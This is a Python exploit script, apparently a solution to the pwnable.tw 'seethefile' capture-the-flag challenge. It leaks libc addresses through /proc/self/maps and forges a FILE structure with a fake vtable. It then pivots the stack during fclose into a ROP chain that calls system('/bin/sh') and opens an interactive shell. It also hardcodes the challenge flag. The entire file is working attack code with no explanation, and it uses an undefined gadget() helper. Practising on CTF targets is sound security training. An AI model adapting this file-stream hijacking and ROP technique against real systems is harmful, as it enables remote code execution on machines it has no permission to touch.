#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from haxy import *

exe = context.binary = ELF('./seethefile')
host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10200)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *old_do_write+121
continue
'''.format(**locals())

# -- Exploit goes here --
def option(choice):
    io.sendlineafter("Your choice :", str(choice))

def open_file(filename):
    option(1)
    io.sendlineafter("What do you want to see :", filename)

def read_file():
    option(2)

def write_file():
    option(3)

def ORW(filename):
    open_file(filename)
    read_file()
    write_file()

libc = ELF(exe.libc.path)
io = start()
ORW("/proc/self/maps")
read_file()
print(write_file())
for i in range(5):
    print(io.recvline())
libc.address = int(input("Libc base : ").strip("\n"), 16)

payload = b'\x00'*4
payload += p32(0x0)*3
payload += p32(0x0) #write base
payload += p32(0x1) #write ptr
payload += p32(0x0) #write end
payload += p32(0x0) #buf base
payload += p32(0x1) #buf end
payload += p32(0x0) * 9
payload += p32(0x804b6c0) #_lock -> pointer to null
payload += p32(0x0) *8
payload += b'\x00'*40
payload += p32(0x804b438 - 8) #fake vtable addr
payload += p32(0xdeadbeef) #junk
payload += b'\x00'*0x100 #junk
payload += p32(1)
payload += p32(2)
payload += p32(3)
payload += p32(gadget("ret;"))
payload += p32(gadget("pop edx; pop ecx; pop eax; ret;"))
payload += p32(gadget("ret;"))
payload += p32(gadget("xchg eax, esp; ret;")) # this will be called during fclose -> stack pivot to bss to ret chain and then onegadget
payload += p32(0x0)
payload += p32(gadget("ret;"))*5
payload += p32(gadget("pop esi; ret"))
payload += p32(libc.address + 0x1b0000) #libc GOT address
payload += p32(libc.address + 0x3a819) #one gadget
FLAG = "FLAG{F1l3_Str34m_is_4w3s0m3}"

option(5)
io.sendlineafter("Leave your name :", b'/bin/sh\x00' + p32(libc.sym.system) + b'aaaabaaacaaadaaaeaaa' + p32(0x804b284) + payload)

io.interactive()